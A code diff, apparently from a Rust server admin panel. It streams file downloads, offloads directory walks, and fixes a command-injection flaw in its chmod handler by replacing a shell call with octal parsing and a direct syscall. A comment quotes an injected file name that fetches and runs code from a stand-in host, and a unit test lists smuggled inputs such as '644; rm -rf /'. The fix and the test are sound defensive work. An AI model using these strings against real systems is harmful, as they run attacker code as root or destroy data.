@@ -337,8 +337,10 @@ async fn download_file(Query(q): Query<PathQuery>) -> Response<Body> {
             .unwrap_or_else(|_| Response::new(Body::empty()));
     }
 
-    let bytes = match std::fs::read(file_path) {
-        Ok(data) => data,
+    // Streamed: reading the whole file into memory let one large download
+    // (logs, backups) take the panel down with an out-of-memory kill.
+    let file = match tokio::fs::File::open(file_path).await {
+        Ok(file) => file,
         Err(error) => {
             return Response::builder()
                 .status(StatusCode::INTERNAL_SERVER_ERROR)
@@ -347,14 +349,19 @@ async fn download_file(Query(q): Query<PathQuery>) -> Response<Body> {
                 .unwrap_or_else(|_| Response::new(Body::empty()));
         }
     };
+    let length = file.metadata().await.map(|m| m.len()).ok();
 
     let mime = mime_guess::from_path(file_path).first_or_octet_stream();
-    Response::builder()
+    let mut response = Response::builder()
         .status(StatusCode::OK)
         .header(header::CONTENT_TYPE, mime.as_ref())
         .header(header::CONTENT_DISPOSITION, "attachment")
-        .header(header::CACHE_CONTROL, "no-cache")
-        .body(Body::from(bytes))
+        .header(header::CACHE_CONTROL, "no-cache");
+    if let Some(length) = length {
+        response = response.header(header::CONTENT_LENGTH, length);
+    }
+    response
+        .body(Body::from_stream(tokio_util::io::ReaderStream::new(file)))
         .unwrap_or_else(|_| Response::new(Body::empty()))
 }
 
@@ -368,7 +375,11 @@ async fn directory_size(Query(q): Query<PathQuery>) -> Json<ApiResponse<DirSizeP
         return Json(ApiResponse::err("Path is not a directory"));
     }
 
-    let size = calculate_directory_size(path);
+    // A walk over a large tree takes minutes; keep it off the async workers.
+    let walk_path = path.to_path_buf();
+    let size = tokio::task::spawn_blocking(move || calculate_directory_size(&walk_path))
+        .await
+        .unwrap_or(0);
     Json(ApiResponse::ok(DirSizePayload {
         path: normalized_path,
         size,
@@ -463,6 +474,15 @@ struct ChmodRequest {
     mode: String,
 }
 
+/// "644", "0755", "4755" -> mode bits; anything else is rejected.
+fn parse_octal_mode(raw: &str) -> Option<u32> {
+    let raw = raw.trim();
+    if !(3..=4).contains(&raw.len()) || !raw.bytes().all(|b| (b'0'..=b'7').contains(&b)) {
+        return None;
+    }
+    u32::from_str_radix(raw, 8).ok()
+}
+
 async fn chmod_path(Json(req): Json<ChmodRequest>) -> Json<ApiResponse<()>> {
     let normalized_path = normalize_fs_path(&req.path);
     let p = std::path::Path::new(&normalized_path);
@@ -471,21 +491,17 @@ async fn chmod_path(Json(req): Json<ChmodRequest>) -> Json<ApiResponse<()>> {
     }
     #[cfg(unix)]
     {
-        let cmd_str = format!("chmod {} '{}'", req.mode, normalized_path);
-        match std::process::Command::new("sh")
-            .arg("-c")
-            .arg(&cmd_str)
-            .output()
-        {
-            Ok(output) => {
-                if output.status.success() {
-                    Json(ApiResponse::ok_msg("Permission changed"))
-                } else {
-                    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-                    Json(ApiResponse::err(&format!("Failed: {}", stderr)))
-                }
-            }
-            Err(e) => Json(ApiResponse::err(&e.to_string())),
+        // Mode and path once went into `sh -c "chmod {mode} '{path}'"`: a file
+        // named `x';curl evil|sh;'` (e.g. dropped by a compromised website)
+        // ran as root the moment an admin changed its permissions. Now the
+        // mode is parsed as octal and applied with a direct syscall.
+        let Some(mode) = parse_octal_mode(&req.mode) else {
+            return Json(ApiResponse::err("Mode must be octal, e.g. 644 or 0755"));
+        };
+        use std::os::unix::fs::PermissionsExt;
+        match std::fs::set_permissions(p, std::fs::Permissions::from_mode(mode)) {
+            Ok(()) => Json(ApiResponse::ok_msg("Permission changed")),
+            Err(e) => Json(ApiResponse::err(&format!("Failed: {}", e))),
         }
     }
     #[cfg(windows)]
@@ -1269,4 +1285,26 @@ async fn exec_cmd_stream(Json(req): Json<ExecRequest>) -> Response {
         .header(header::CACHE_CONTROL, "no-cache")
         .body(Body::from_stream(stream))
         .unwrap_or_else(|_| Response::new(Body::empty()))
+}
+
+#[cfg(test)]
+mod tests {
+    #[test]
+    fn chmod_modes_are_strictly_octal() {
+        assert_eq!(super::parse_octal_mode("644"), Some(0o644));
+        assert_eq!(super::parse_octal_mode("0755"), Some(0o755));
+        assert_eq!(super::parse_octal_mode("4755"), Some(0o4755));
+        for bad in [
+            "",
+            "8",
+            "64",
+            "77777",
+            "644; rm -rf /",
+            "u+x",
+            "-R 777",
+            "0x1ff",
+        ] {
+            assert_eq!(super::parse_octal_mode(bad), None, "{bad}");
+        }
+    }
 }
